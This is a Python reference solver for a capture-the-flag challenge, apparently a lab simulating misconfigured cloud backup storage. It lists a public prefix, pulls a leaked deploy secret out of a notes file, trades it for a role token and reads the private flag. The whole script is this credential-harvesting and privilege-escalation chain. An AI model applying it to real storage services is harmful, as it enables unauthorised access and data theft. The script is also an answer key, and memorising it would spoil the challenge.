#!/usr/bin/env python3
"""Reference solver for cloud-backup-prefix.

List the public prefix -> read backup-notes.txt -> extract the leaked deploy
credential -> assume the backup-restore role -> read private/flag.

    python3 solve.py http://HOST:PORT
"""
import json
import re
import sys
import urllib.request


def get(url, headers=None):
    req = urllib.request.Request(url, headers=headers or {})
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    keys = get(base + "/list?prefix=public/")["keys"]
    notes_key = next(k for k in keys if "notes" in k)
    body = get(base + "/get?key=" + notes_key)["body"]
    secret = re.search(r"deploy_secret=(\S+)", body).group(1)
    token = get(base + "/assume?secret=" + secret)["token"]
    return get(base + "/get?key=private/flag", {"X-Role-Token": token})["body"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
